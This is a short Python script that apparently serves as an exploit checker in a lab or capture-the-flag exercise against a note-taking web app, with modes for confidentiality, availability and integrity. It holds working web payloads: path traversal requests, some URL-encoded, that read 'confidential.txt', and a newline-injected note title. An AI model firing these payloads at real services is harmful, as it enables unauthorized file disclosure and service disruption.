import requests
import sys
#172.24.0.2
attack_type = sys.argv[1]
ipsocket = "172.24.1.2:8080"
ipsocket = sys.argv[2]
url = f"http://{ipsocket}"

## confidentiality 
if attack_type == 'C':
    s = requests.Session()
    # Test traversals with increasing '../' count
    traversal = "/note/d/../confidential.txt"
    turl = url + traversal
    response = s.get(turl)
    traversal = "/note/..%2F..%2F..%2Fconfidential.txt"
    turl = url + traversal

    response = s.get(turl)
    print(response.text)
## availability
if attack_type == "A":

    s = requests.Session()
    res = requests.get(url)
    payload = {
        "title": "evil\nbreak",
        "author": "tester",
        "content": "trigger"
    }
    s.post(f"{url}/create", data=payload)

    resp = s.get(f"{url}/check_broken_availability")
    print(resp.text)        
if attack_type == 'I':

    ## integrity 

    s = requests.Session()
    url_create = f"{url}/create"
    url_note = f"{url}/note/My_Family_Tea_Recipe.txt"


    data = {
        'title': 'My_Family_Tea_Recipe',
        'author': 'John Doe',
        'content': 'This is some example content for the post.'
    }
    response = requests.post(url,data=data)
    s.post(url_create, data=data)
    res = s.get(url_note)
    res = s.get(f"{url}/check_broken_integrity")
    print(res.text)

